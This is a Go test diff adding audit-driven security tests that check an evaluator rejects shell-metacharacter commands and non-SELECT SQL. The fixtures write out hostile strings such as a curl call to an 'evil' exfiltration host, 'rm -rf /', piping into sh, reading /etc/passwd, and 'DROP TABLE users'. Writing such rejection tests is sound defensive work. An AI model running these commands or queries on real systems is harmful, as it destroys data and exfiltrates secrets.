@@ -214,3 +214,65 @@ func TestReadDatabaseURL_EmptyFile(t *testing.T) {
 		t.Errorf("readDatabaseURL = %q, want empty", got)
 	}
 }
+
+// --- security guards (added by audit) ---
+
+func TestEvaluate_MigrationSucceeds_RejectsMetacharacters(t *testing.T) {
+	workDir := setupNXDDB(t, "postgres://x@x/x")
+	for _, cmd := range []string{
+		"true; curl http://evil/exfil",
+		"migrate up && rm -rf /",
+		"echo $(whoami)",
+		"goose up | sh",
+		"psql < /etc/passwd",
+	} {
+		c := Criterion{Type: TypeMigrationSucceeds, Command: cmd}
+		result := Evaluate(context.Background(), workDir, c)
+		if result.Passed {
+			t.Errorf("metacharacter command %q should be rejected", cmd)
+		}
+		if !strings.Contains(result.Message, "shell metacharacters") {
+			t.Errorf("expected metacharacter rejection for %q, got: %s", cmd, result.Message)
+		}
+	}
+}
+
+func TestValidateReadOnlyQuery(t *testing.T) {
+	ok := []string{
+		"SELECT 1",
+		"  select * from users  ",
+		"WITH t AS (SELECT 1) SELECT * FROM t",
+		"SELECT count(*) FROM orders;",
+	}
+	for _, q := range ok {
+		if err := validateReadOnlyQuery(q); err != nil {
+			t.Errorf("expected %q to be allowed, got: %v", q, err)
+		}
+	}
+	bad := []string{
+		"",
+		"DROP TABLE users",
+		"DELETE FROM users",
+		"UPDATE users SET x=1",
+		"SELECT 1; DROP TABLE users",
+		"INSERT INTO t VALUES (1)",
+		"SELECT 1; SELECT 2",
+	}
+	for _, q := range bad {
+		if err := validateReadOnlyQuery(q); err == nil {
+			t.Errorf("expected %q to be rejected", q)
+		}
+	}
+}
+
+func TestEvaluate_SQLQueryReturns_RejectsNonSelect(t *testing.T) {
+	workDir := setupNXDDB(t, "postgres://x@x/x")
+	c := Criterion{Type: TypeSQLQueryReturns, SQL: "DROP TABLE users"}
+	result := Evaluate(context.Background(), workDir, c)
+	if result.Passed {
+		t.Error("non-SELECT query should be rejected")
+	}
+	if !strings.Contains(result.Message, "only SELECT/WITH") {
+		t.Errorf("expected SELECT-only rejection, got: %s", result.Message)
+	}
+}
